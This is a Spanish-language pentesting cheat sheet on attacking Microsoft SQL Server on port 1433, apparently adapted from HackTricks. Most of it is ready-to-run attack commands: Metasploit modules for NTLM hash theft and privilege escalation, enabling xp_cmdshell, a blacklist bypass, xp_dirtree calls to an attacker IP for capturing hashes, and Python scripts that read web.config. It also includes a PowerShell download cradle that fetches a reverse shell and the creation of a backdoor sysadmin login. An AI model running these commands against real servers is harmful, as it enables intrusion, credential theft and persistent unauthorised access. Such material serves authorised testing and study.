---
description: Microsoft SQL y como ganar acceso al objetivo.
---

# 1443 - MSSQL

## INFORMACIÓN BÁSICA

{% embed url="https://openwebinars.net/blog/que-es-sql-server" %}
Fuente
{% endembed %}

**Microsoft SQL Server es la alternativa de Microsoft** a otros potentes sistemas gestores de bases de datos. Es un sistema de gestión de base de datos relacional desarrollado como un servidor que da servicio a otras aplicaciones de software que pueden funcionar ya sea en el mismo ordenador o en otro ordenador a través de una red (incluyendo Internet).

Los servidores SQL Server suelen presentar como principal característica una **alta disponibilidad** al permitir un gran tiempo de actividad y una conmutación más rápida. Todo esto sin sacrificar los recursos de memoria del sistema. Gracias a las funciones de memoria integradas directamente en los motores de base de datos SQL Server y de análisis, **mejora la flexibilidad y se facilita el uso**. Pero quizá su característica más destacada es que ofrece una solución robusta que se integra a la perfección con la familia de servidores Microsoft Server.&#x20;

Características de Microsoft SQL Server :

* Soporte de transacciones.
* Escalabilidad, estabilidad y seguridad.
* Soporte de procedimientos almacenados.
* Incluye también un potente entorno gráfico de administración, que permite el
* uso de comandos DDL y DML gráficamente.
* Permite trabajar en modo cliente-servidor, donde la información y datos se alojan en el servidor y las terminales o clientes de la red solo acceden a la información.
* Permite administrar información de otros servidores de datos.\


```
1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
```

## INFORMACIÓN

{% embed url="https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server" %}
Fuente
{% endembed %}

### Tablas de sistema por defecto

El servicio MSSQL crea una serie de tablas por defecto que contienen la siguiente información:

* **master Database** : Guarda toda la información a nivel de sistema para una instancia de SQL Server.
* **msdb Database** : Utilizada por el SQL Server Agent para tareas programadas y alertas.
* **model Database** : Es utilizada como ejemplo para todas las bases de datos creadas en la instancia de SQL Server. Todas las modificaciones que sufra como el tamaño o la estructura será aplicado a todas las bases de datos que se creen en el futuro.
* **Resource Database** : Una base de datos de solo lectura que contiene objetos del sistema que están incluidos en SQL Server. Estos objetos aparecen referenciados en todos los esquemas de las bases de datos creadas.
* **tempdb Database** : Es un espacio de trabajo donde se almacenan los objetos temporales o resultados intermedios.

### Recolección de Información

Si no sabe nada acerca del servicio puede utilizar:

```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
msf> use auxiliary/scanner/mssql/mssql_ping
```

Si no tiene credenciales válidos puede tratar de adivinarlos o utilizar **nmap** o **metasploit**.

{% hint style="danger" %}
CUIDADO

Una cuenta puede bloquearse si se falla en el login unas cuantas veces.
{% endhint %}

#### Metasploit

```
#Set USERNAME, RHOSTS and PASSWORD
#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used

#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

#Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump

#Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf

#Privesc
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin

#Code execution
msf> use admin/mssql/mssql_exec #Execute commands
msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload

#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass
```

## VULNERABILIDADES

### Ejecución de comandos

```
#Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
#Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'

#this turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
#this enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'

# Bypass blackisted "EXEC xp_cmdshell"
‘; DECLARE @x AS VARCHAR(100)=’xp_cmdshell’; EXEC @x ‘ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net’ —
```

### Recolección de Hashes NTLM

Este proceso se puede realizar utilizando **impacket-smbserver** o **responder**. Sin embargo tambien hay un módulo de metasploit que permite robar hashes NTLM mediante mssql:

```
xp_dirtree '\\<attacker_IP>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
```

### Explotar los links confiables

{% embed url="https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links" %}
Fuente
{% endembed %}

### Leer y ejecutar scripts en Python y R

MSSQL puede ejecutar scripts en Python y en R. Estos códigos serán ejecutados por un usuario diferente que el que está utilizando xp\_cmdshell para ejecutar los comandos.

Ejemplo utilizando Python:

```
#Print the user being used (and execute commands)
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
#Open and read a file
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
#Multiline
EXECUTE sp_execute_external_script @language = N'Python', @script = N'
import sys
print(sys.version)
'
GO
```

### De db\_owner a sysadmin

Si tienes los credenciales de un db\_owner puedes alcanzar privilegios de sysadmin y ejecutar comandos:

```
msf> use auxiliary/admin/mssql/mssql_escalate_dbowner
```

### Privilegio IMPERSONATE

Este privilegio puede llevar a escalada de privilegios en MSSQL.

```
msf> auxiliary/admin/mssql/mssql_escalate_execute_as
```

### MSSQL para persistencia

{% embed url="https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures" %}
Fuente
{% endembed %}

## TENIENDO CREDENCIALES

### Mssqlclient.py

Se puede utilizar el impacket mssqlclient.py para utilizar el servicio:

```
mssqlclient.py  -db volume -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP> #Recommended -windows-auth when you are going to use a domain. use as domain the netBIOS name of the machine

#Once logged in you can run queries:
SQL> select @@ version;

#Steal NTLM hash
sudo responder -I <interface> #Run that in other console
SQL> exec master..xp_dirtree '\\<YOUR_RESPONDER_IP>\test' #Steal the NTLM hash, crack it with john or hashcat

#Try to enable code execution
SQL> enable_xp_cmdshell

#Solve problem if no code executes
EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1
reconfigure;
xp_cmdshell "whoami"

#Execute code, 2 sintax, for complex and non complex cmds
SQL> xp_cmdshell whoami /all
SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'
```

### Manual

```
SELECT name FROM master.dbo.sysdatabases #Get databases
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES; #Get table names
#List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;
#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
sp_addsrvrolemember 'hacker', 'sysadmin'
```
